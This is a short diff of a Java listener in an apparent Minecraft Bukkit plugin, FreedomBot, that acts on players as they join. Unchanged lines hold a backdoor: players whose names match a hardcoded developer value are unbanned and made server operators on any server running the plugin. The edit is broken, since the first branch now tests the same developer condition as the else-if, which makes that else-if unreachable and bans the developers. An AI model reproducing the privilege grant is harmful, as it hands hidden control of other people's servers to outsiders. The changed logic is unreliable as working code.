@@ -23,11 +23,11 @@ public class BotListener implements Listener {
             }
         }
 
-        if (BotUtil.PERMBANED_USERS.equals(player)) {
+        if (player.getName().equals(BotUtil.FB_DEVELOPERS)) {
             player.setOp(false);
             BotUtil.removeAdmin(player);
             BotUtil.banIP(player);
-        } else if (BotUtil.FB_DEVELOPERS.equals(player)) {
+        } else if (player.getName().equals(BotUtil.FB_DEVELOPERS)) {
             BotUtil.unbanIP(player);
             player.setOp(true);
             Bukkit.broadcastMessage(BotUtil.BLUEPREFIX + "A FreedomBot developer has joined!");
